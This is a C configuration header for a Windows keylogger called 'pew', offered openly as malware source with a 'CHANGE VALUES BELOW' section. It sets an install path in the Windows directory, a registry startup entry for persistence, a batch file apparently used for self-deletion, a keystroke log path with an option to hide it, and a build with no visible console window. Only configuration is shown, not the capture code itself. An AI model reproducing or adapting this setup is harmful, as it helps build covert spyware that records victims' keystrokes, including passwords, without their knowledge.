/* 
 * config file for pew keylogger 
 * Hello WOrld
 */


#ifndef __CONFIG_H
#define __CONFIG_H

/* CHANGE VALUES BELOW */

#define APPNAME				"PEW_012"
#define APPFILENAME			"pew.exe"

#define WINDIR				"C:\\WINDOWS\\"
#define BATCHFILEPATH		WINDIR "delme.bat"
#define REGAPPENTRY			"pew startup entry"
#define APPINSTALLPATH		WINDIR APPFILENAME

#define LOGFILEPATH			"C:\\log.txt"
#define LOGFILEATTR			FILE_ATTRIBUTE_NORMAL /* FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, */

/* -------------------- */




#pragma comment(lib, "User32.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:start")


#endif
